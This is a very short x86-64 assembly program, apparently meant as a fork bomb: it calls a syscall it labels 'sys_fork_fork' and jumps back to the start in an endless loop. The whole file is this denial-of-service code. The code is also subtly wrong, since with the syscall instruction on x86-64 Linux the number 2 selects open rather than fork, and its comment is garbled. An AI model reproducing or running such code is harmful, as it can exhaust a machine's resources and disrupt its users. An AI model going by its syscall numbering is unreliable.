section .text
    global _start

_start:
    mov eax, 2 ; sys_fork_fork
    syscall
    jmp _start; endless loop
